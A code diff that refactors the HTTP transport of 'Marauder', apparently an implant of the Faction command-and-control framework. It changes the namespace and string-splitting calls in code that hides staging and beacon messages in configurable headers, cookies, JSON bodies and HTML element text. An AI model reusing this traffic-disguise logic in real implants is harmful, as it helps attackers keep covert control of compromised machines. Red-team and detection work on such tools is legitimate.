@@ -8,7 +8,7 @@ using Faction.Modules.Dotnet.Common;
 using HtmlAgilityPack;
 using Newtonsoft.Json;
 
-namespace Marauder.Common
+namespace Faction.Modules.Dotnet.Common
 {
     public class Transport  : AgentTransport
     {
@@ -93,23 +93,23 @@ namespace Marauder.Common
 
                 // Add the Stage Message into the request per the configuration
                 var _messageLocation = _config.HttpPost["ClientPayload"]["Message"];
-                if (_messageLocation.Split("::".ToCharArray(), StringSplitOptions.RemoveEmptyEntries)[0] == "Header")
-                    _webClient.Headers.Add(_messageLocation.Split("::".ToCharArray(), StringSplitOptions.RemoveEmptyEntries)[1], StageMessage);
-                if (_messageLocation.Split("::".ToCharArray(), StringSplitOptions.RemoveEmptyEntries)[0] == "Cookie")
-                    _webClient.Headers.Add(HttpRequestHeader.Cookie, $"{_messageLocation.Split("::".ToCharArray(), StringSplitOptions.RemoveEmptyEntries)[1]}={StageMessage}");
+                if (_messageLocation.Split(new string[] {"::"}, StringSplitOptions.RemoveEmptyEntries)[0] == "Header")
+                    _webClient.Headers.Add(_messageLocation.Split(new string[] {"::"}, StringSplitOptions.RemoveEmptyEntries)[1], StageMessage);
+                if (_messageLocation.Split(new string[] {"::"}, StringSplitOptions.RemoveEmptyEntries)[0] == "Cookie")
+                    _webClient.Headers.Add(HttpRequestHeader.Cookie, $"{_messageLocation.Split(new string[] {"::"}, StringSplitOptions.RemoveEmptyEntries)[1]}={StageMessage}");
 
                 // For a Staging Message, map AgentName to StagingId
                 var _agentLocation = _config.HttpPost["ClientPayload"]["AgentName"];
-                if (_agentLocation.Split("::".ToCharArray(), StringSplitOptions.RemoveEmptyEntries)[0] == "Header")
-                    _webClient.Headers.Add(_agentLocation.Split("::".ToCharArray(), StringSplitOptions.RemoveEmptyEntries)[1], StagingId);
-                if (_agentLocation.Split("::".ToCharArray(), StringSplitOptions.RemoveEmptyEntries)[0] == "Cookie")
-                    _webClient.Headers.Add(HttpRequestHeader.Cookie, $"{_agentLocation.Split("::".ToCharArray(), StringSplitOptions.RemoveEmptyEntries)[1]}={StagingId}");
+                if (_agentLocation.Split(new string[] {"::"}, StringSplitOptions.RemoveEmptyEntries)[0] == "Header")
+                    _webClient.Headers.Add(_agentLocation.Split(new string[] {"::"}, StringSplitOptions.RemoveEmptyEntries)[1], StagingId);
+                if (_agentLocation.Split(new string[] {"::"}, StringSplitOptions.RemoveEmptyEntries)[0] == "Cookie")
+                    _webClient.Headers.Add(HttpRequestHeader.Cookie, $"{_agentLocation.Split(new string[] {"::"}, StringSplitOptions.RemoveEmptyEntries)[1]}={StagingId}");
 
                 var _nameLocation = _config.HttpPost["ClientPayload"]["StageName"];
-                if (_nameLocation.Split("::".ToCharArray(), StringSplitOptions.RemoveEmptyEntries)[0] == "Header")
-                    _webClient.Headers.Add(_nameLocation.Split("::".ToCharArray(), StringSplitOptions.RemoveEmptyEntries)[1], StageName);
-                if (_nameLocation.Split("::".ToCharArray(), StringSplitOptions.RemoveEmptyEntries)[0] == "Cookie")
-                    _webClient.Headers.Add(HttpRequestHeader.Cookie, $"{_nameLocation.Split("::".ToCharArray(), StringSplitOptions.RemoveEmptyEntries)[1]}={StageName}");
+                if (_nameLocation.Split(new string[] {"::"}, StringSplitOptions.RemoveEmptyEntries)[0] == "Header")
+                    _webClient.Headers.Add(_nameLocation.Split(new string[] {"::"}, StringSplitOptions.RemoveEmptyEntries)[1], StageName);
+                if (_nameLocation.Split(new string[] {"::"}, StringSplitOptions.RemoveEmptyEntries)[0] == "Cookie")
+                    _webClient.Headers.Add(HttpRequestHeader.Cookie, $"{_nameLocation.Split(new string[] {"::"}, StringSplitOptions.RemoveEmptyEntries)[1]}={StageName}");
 
                 // get all the properties that should be in the Body section
                 var _bodyProperties = _config.HttpPost["ClientPayload"]
@@ -120,11 +120,11 @@ namespace Marauder.Common
                 foreach (var property in _bodyProperties)
                 {
                     if (property.Key == "StageName")
-                        _bodyContent.Add($"{property.Value.Split("::".ToCharArray(), StringSplitOptions.RemoveEmptyEntries)[1]}", $"{StageName}");
+                        _bodyContent.Add($"{property.Value.Split(new string[] {"::"}, StringSplitOptions.RemoveEmptyEntries)[1]}", $"{StageName}");
                     if (property.Key == "AgentName")
-                        _bodyContent.Add($"{property.Value.Split("::".ToCharArray(), StringSplitOptions.RemoveEmptyEntries)[1]}", $"{StagingId}");
+                        _bodyContent.Add($"{property.Value.Split(new string[] {"::"}, StringSplitOptions.RemoveEmptyEntries)[1]}", $"{StagingId}");
                     if (property.Key == "Message")
-                        _bodyContent.Add($"{property.Value.Split("::".ToCharArray(), StringSplitOptions.RemoveEmptyEntries)[1]}", $"{StageMessage}");
+                        _bodyContent.Add($"{property.Value.Split(new string[] {"::"}, StringSplitOptions.RemoveEmptyEntries)[1]}", $"{StageMessage}");
                 }
 
                 string jsonMessage = JsonConvert.SerializeObject(_bodyContent);
@@ -164,16 +164,16 @@ namespace Marauder.Common
 
                 // Add the Beacon Message into the request per the configuration
                 var _messageLocation = _config.HttpGet["ClientPayload"]["Message"];
-                if (_messageLocation.Split("::".ToCharArray(), StringSplitOptions.RemoveEmptyEntries)[0] == "Header")
-                    _webClient.Headers.Add(_messageLocation.Split("::".ToCharArray(), StringSplitOptions.RemoveEmptyEntries)[1], Message);
-                if (_messageLocation.Split("::".ToCharArray(), StringSplitOptions.RemoveEmptyEntries)[0] == "Cookie")
-                    _webClient.Headers.Add(HttpRequestHeader.Cookie, $"{_messageLocation.Split("::".ToCharArray(), StringSplitOptions.RemoveEmptyEntries)[1]}={Message}");
+                if (_messageLocation.Split(new string[] {"::"}, StringSplitOptions.RemoveEmptyEntries)[0] == "Header")
+                    _webClient.Headers.Add(_messageLocation.Split(new string[] {"::"}, StringSplitOptions.RemoveEmptyEntries)[1], Message);
+                if (_messageLocation.Split(new string[] {"::"}, StringSplitOptions.RemoveEmptyEntries)[0] == "Cookie")
+                    _webClient.Headers.Add(HttpRequestHeader.Cookie, $"{_messageLocation.Split(new string[] {"::"}, StringSplitOptions.RemoveEmptyEntries)[1]}={Message}");
 
                 var _nameLocation = _config.HttpGet["ClientPayload"]["AgentName"];
-                if (_nameLocation.Split("::".ToCharArray(), StringSplitOptions.RemoveEmptyEntries)[0] == "Header")
-                    _webClient.Headers.Add(_nameLocation.Split("::".ToCharArray(), StringSplitOptions.RemoveEmptyEntries)[1], AgentName);
-                if (_nameLocation.Split("::".ToCharArray(), StringSplitOptions.RemoveEmptyEntries)[0] == "Cookie")
-                    _webClient.Headers.Add(HttpRequestHeader.Cookie, $"{_nameLocation.Split("::".ToCharArray(), StringSplitOptions.RemoveEmptyEntries)[1]}={AgentName}");
+                if (_nameLocation.Split(new string[] {"::"}, StringSplitOptions.RemoveEmptyEntries)[0] == "Header")
+                    _webClient.Headers.Add(_nameLocation.Split(new string[] {"::"}, StringSplitOptions.RemoveEmptyEntries)[1], AgentName);
+                if (_nameLocation.Split(new string[] {"::"}, StringSplitOptions.RemoveEmptyEntries)[0] == "Cookie")
+                    _webClient.Headers.Add(HttpRequestHeader.Cookie, $"{_nameLocation.Split(new string[] {"::"}, StringSplitOptions.RemoveEmptyEntries)[1]}={AgentName}");
 
                 Console.WriteLine($"[Marauder Http Transport] Sending Get. URL: {beaconUrl}");
 
@@ -208,16 +208,16 @@ namespace Marauder.Common
 
                 // Add the Beacon Message into the request per the configuration
                 var _messageLocation = _config.HttpPost["ClientPayload"]["Message"];
-                if (_messageLocation.Split("::".ToCharArray(), StringSplitOptions.RemoveEmptyEntries)[0] == "Header")
-                    _webClient.Headers.Add(_messageLocation.Split("::".ToCharArray(), StringSplitOptions.RemoveEmptyEntries)[1], Message);
-                if (_messageLocation.Split("::".ToCharArray(), StringSplitOptions.RemoveEmptyEntries)[0] == "Cookie")
-                    _webClient.Headers.Add(HttpRequestHeader.Cookie, $"{_messageLocation.Split("::".ToCharArray(), StringSplitOptions.RemoveEmptyEntries)[1]}={Message}");
+                if (_messageLocation.Split(new string[] {"::"}, StringSplitOptions.RemoveEmptyEntries)[0] == "Header")
+                    _webClient.Headers.Add(_messageLocation.Split(new string[] {"::"}, StringSplitOptions.RemoveEmptyEntries)[1], Message);
+                if (_messageLocation.Split(new string[] {"::"}, StringSplitOptions.RemoveEmptyEntries)[0] == "Cookie")
+                    _webClient.Headers.Add(HttpRequestHeader.Cookie, $"{_messageLocation.Split(new string[] {"::"}, StringSplitOptions.RemoveEmptyEntries)[1]}={Message}");
 
                 var _nameLocation = _config.HttpPost["ClientPayload"]["AgentName"];
-                if (_nameLocation.Split("::".ToCharArray(), StringSplitOptions.RemoveEmptyEntries)[0] == "Header")
-                    _webClient.Headers.Add(_nameLocation.Split("::".ToCharArray(), StringSplitOptions.RemoveEmptyEntries)[1], AgentName);
-                if (_nameLocation.Split("::".ToCharArray(), StringSplitOptions.RemoveEmptyEntries)[0] == "Cookie")
-                    _webClient.Headers.Add(HttpRequestHeader.Cookie, $"{_nameLocation.Split("::".ToCharArray(), StringSplitOptions.RemoveEmptyEntries)[1]}={AgentName}");
+                if (_nameLocation.Split(new string[] {"::"}, StringSplitOptions.RemoveEmptyEntries)[0] == "Header")
+                    _webClient.Headers.Add(_nameLocation.Split(new string[] {"::"}, StringSplitOptions.RemoveEmptyEntries)[1], AgentName);
+                if (_nameLocation.Split(new string[] {"::"}, StringSplitOptions.RemoveEmptyEntries)[0] == "Cookie")
+                    _webClient.Headers.Add(HttpRequestHeader.Cookie, $"{_nameLocation.Split(new string[] {"::"}, StringSplitOptions.RemoveEmptyEntries)[1]}={AgentName}");
 
                 // get all the properties that should be in the Body section
                 var _bodyProperties = _config.HttpPost["ClientPayload"]
@@ -228,9 +228,9 @@ namespace Marauder.Common
                 foreach (var property in _bodyProperties)
                 {
                     if (property.Key == "AgentName")
-                        _bodyContent.Add($"{property.Value.Split("::".ToCharArray(), StringSplitOptions.RemoveEmptyEntries)[1]}", $"{AgentName}");
+                        _bodyContent.Add($"{property.Value.Split(new string[] {"::"}, StringSplitOptions.RemoveEmptyEntries)[1]}", $"{AgentName}");
                     if (property.Key == "Message")
-                        _bodyContent.Add($"{property.Value.Split("::".ToCharArray(), StringSplitOptions.RemoveEmptyEntries)[1]}", $"{Message}");
+                        _bodyContent.Add($"{property.Value.Split(new string[] {"::"}, StringSplitOptions.RemoveEmptyEntries)[1]}", $"{Message}");
                 }
 
                 string jsonMessage = JsonConvert.SerializeObject(_bodyContent);
@@ -268,19 +268,19 @@ namespace Marauder.Common
                     string _propKey = null;
                     string _propValue;
 
-                    if (property.Value.Split("::".ToCharArray(), StringSplitOptions.RemoveEmptyEntries)[0] == "Header")
+                    if (property.Value.Split(new string[] {"::"}, StringSplitOptions.RemoveEmptyEntries)[0] == "Header")
                     {
                         _propKey = property.Key;
-                        _propValue = responseHeaders[property.Value.Split("::".ToCharArray(), StringSplitOptions.RemoveEmptyEntries)[1]];
+                        _propValue = responseHeaders[property.Value.Split(new string[] {"::"}, StringSplitOptions.RemoveEmptyEntries)[1]];
                         _message.Add(_propKey, _propValue);
                     }
 
-                    if (property.Value.Split("::".ToCharArray(), StringSplitOptions.RemoveEmptyEntries)[0] == "Body")
+                    if (property.Value.Split(new string[] {"::"}, StringSplitOptions.RemoveEmptyEntries)[0] == "Body")
                     {
                         _propKey = property.Key;
                         HtmlDocument pageDocument = new HtmlDocument();
                         pageDocument.LoadHtml(pageContent);
-                        _propValue = pageDocument.GetElementbyId(property.Value.Split("::".ToCharArray(), StringSplitOptions.RemoveEmptyEntries)[1].Trim(new Char[] { '%' })).InnerText;
+                        _propValue = pageDocument.GetElementbyId(property.Value.Split(new string[] {"::"}, StringSplitOptions.RemoveEmptyEntries)[1].Trim(new Char[] { '%' })).InnerText;
                         _message.Add(_propKey, _propValue);
                     }
                 }
@@ -294,19 +294,19 @@ namespace Marauder.Common
                     string _propKey = null;
                     string _propValue;
 
-                    if (property.Value.Split("::".ToCharArray(), StringSplitOptions.RemoveEmptyEntries)[0] == "Header")
+                    if (property.Value.Split(new string[] {"::"}, StringSplitOptions.RemoveEmptyEntries)[0] == "Header")
                     {
                         _propKey = property.Key;
-                        _propValue = responseHeaders[property.Value.Split("::".ToCharArray(), StringSplitOptions.RemoveEmptyEntries)[1]];
+                        _propValue = responseHeaders[property.Value.Split(new string[] {"::"}, StringSplitOptions.RemoveEmptyEntries)[1]];
                         _message.Add(_propKey, _propValue);
                     }
 
-                    if (property.Value.Split("::".ToCharArray(), StringSplitOptions.RemoveEmptyEntries)[0] == "Body")
+                    if (property.Value.Split(new string[] {"::"}, StringSplitOptions.RemoveEmptyEntries)[0] == "Body")
                     {
                         _propKey = property.Key;
                         HtmlDocument pageDocument = new HtmlDocument();
                         pageDocument.LoadHtml(pageContent);
-                        _propValue = pageDocument.GetElementbyId(property.Value.Split("::".ToCharArray(), StringSplitOptions.RemoveEmptyEntries)[1].Trim(new Char[] { '%' })).InnerText;
+                        _propValue = pageDocument.GetElementbyId(property.Value.Split(new string[] {"::"}, StringSplitOptions.RemoveEmptyEntries)[1].Trim(new Char[] { '%' })).InnerText;
                         _message.Add(_propKey, _propValue);
                     }
                 }
